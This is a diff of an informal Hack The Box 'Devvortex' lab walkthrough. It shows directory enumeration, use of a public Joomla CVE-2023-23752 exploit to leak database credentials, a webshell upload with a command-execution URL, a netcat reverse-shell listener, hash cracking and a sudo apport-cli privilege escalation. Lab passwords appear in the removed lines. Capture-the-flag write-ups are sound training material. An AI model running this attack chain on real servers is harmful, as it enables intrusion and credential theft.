@@ -1,8 +1,9 @@
 # Seasonal Machine devvortex easy machine
 
-Firstly Copy the ip machine and fill it on /etc/hosts devvortex.htb
+# Enumerate 
+Firstly Copy the ip machine and fill it on `/etc/hosts devvortex.htb`
 
-Secondly enumerate subdo with gobuster or fuzz for nmap i scanned but only 22 and 80 port opened
+enumerate subdo with gobuster or fuzz for nmap i scanned but only 22 and 80 port opened
 
 `gobuster vhost -u http://devvortex.htb/ -w /usr/share/wordlists/Seclists/Discovery/DNS/subdomains-top1million-5000.txt -apppend-domain`
 
@@ -11,8 +12,9 @@ after that
 
 Enumerate the files
 
-gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://dev.devvortex.htb/
+`gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://dev.devvortex.htb/`
 
+```
 /administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
 /api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]
 /cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]
@@ -26,32 +28,42 @@ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://dev.devvortex.htb
 /libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]
 /media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]
 /modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]
+```
 
 this mean is this website use joomla because the folder name is administrator and second is /language
 
 so how to exploit it to revshell?we enum again use gobuster again but add .txt like this
-gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://dev.devvortex.htb/ -x .txt
 
-/README.txt           (Status: 200) [Size: 4942]
+```gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://dev.devvortex.htb/ -x .txt```
+
+```/README.txt           (Status: 200) [Size: 4942]```
 
 got it
 so copy the files go to subdo 
 Joomla! CMS™
 
-1- Overview
+# Overview
 	* This is a Joomla! 4.x installation/upgrade package.
 	* Joomla! Official site: https://www.joomla.org
 	* Joomla! 4.2 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_4.2_version_history
 	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev
-    Go to google search Joomla 4.2 Exploit
-You will find this website https://github.com/Acceis/exploit-CVE-2023-23752
-git clone https://github.com/Acceis/exploit-CVE-2023-23752.git
+    
 
+Go to google search Joomla 4.2 Exploit
+
+You will find this website https://github.com/Acceis/exploit-CVE-2023-23752
+
+```
+git clone https://github.com/Acceis/exploit-CVE-2023-23752.
 cd Explot-xxxxx
 gem install httpx docopt paint
-bundle install
 
-run 'ruby exploit.rb http://dev.devvortex.htb'
+or
+
+bundle install```
+
+
+ruby exploit.rb http://dev.devvortex.htb
 
 ```
 Users
@@ -69,7 +81,7 @@ Database info
 DB type: mysqli
 DB host: localhost
 DB user: lewis
-DB password: P4ntherg0t1n5r3c0n##
+DB password: ******
 DB name: joomla
 DB prefix: sd4fg_
 DB encryption 0
@@ -77,7 +89,7 @@ DB encryption 0
 ```
 
 DB user: lewis
-DB password: P4ntherg0t1n5r3c0n##
+DB password: ##&&&**^%&&&
 go login http://dev.devvortex.htb/administrator copy db user and db paswd then paste it to form login
 
 For Upload Shell Search on google joomla upload shell 
@@ -106,8 +118,8 @@ http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php?action=exec&cmd=w
 Its Work Uploaded!!
 
 http://dev.devvortex.htb/c.php
-nc -lvnp 1337
 
+```
 nc -lvnp 1337  
 listening on [any] 1337 ...
 connect to [10.10.14.27] from (UNKNOWN) [10.10.11.242] 33522
@@ -118,16 +130,17 @@ logan    pts/0    10.10.16.2       03:28    1:14m  9.01s  0.03s sshd: logan [pri
 logan    pts/3    10.10.16.11      03:53   31:03  18.99s  0.03s sshd: logan [priv]  
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 sh: 0: can't access tty; job control turned off
-$ 
+$
+```
 
 for login ssh you need login mysql u can use adminer or mysql command like this
 
 do not forgot spawn tty shell python , because if you not spawn tty its now work 
 
-mysql -u lewis -p joomla 
+```mysql -u lewis -p joomla ```
 
-Enter password: 
-P4ntherg0t1n5r3c0n##
+```Enter password: 
+**********
 mysql> use joomla;
 show tables;
 sd4fg_users
@@ -136,14 +149,19 @@ select * from sd4fg_users;
 ------------------------------------------------------------------------------------------
 Username    Password
 ------------------------------------------------------------------------------------------
-logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 
+logan    | $2y$10$IT4k5kmSG*******************************
 
 copy the password and hash it use john the ripper
 
 ssh logan@dev.devvortex.htb 
 
 Hashes password:tequieromucho
+```
 
+
+# Privilege Escalation
+
+```
 logan@devvortex:~$ sudo -l
 [sudo] password for logan: 
 Matching Defaults entries for logan on devvortex:
@@ -151,18 +169,20 @@ Matching Defaults entries for logan on devvortex:
 
 User logan may run the following commands on devvortex:
     (ALL : ALL) /usr/bin/apport-cli
+ ```
+
+# Refference 
+
+https://nvd.nist.gov/vuln/detail/CVE-2023-2660
+
+https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb
 
 
-
--c PATH, --crash-file=PATH
-                        Report the crash from given .apport or .crash file
-                        instead of the pending ones in /var/crash. (Implied if
-                        file is given as only argument.)
-
-sudo /usr/bin/apport-cli -c /bin/chfn less
+`sudo /usr/bin/apport-cli -c /bin/chfn less`
 
 for path anything you can use but do not forget add less 
 
+```
 Please choose (S/V/K/I/C):v
 
 == ProcCpuinfoMinimal =================================
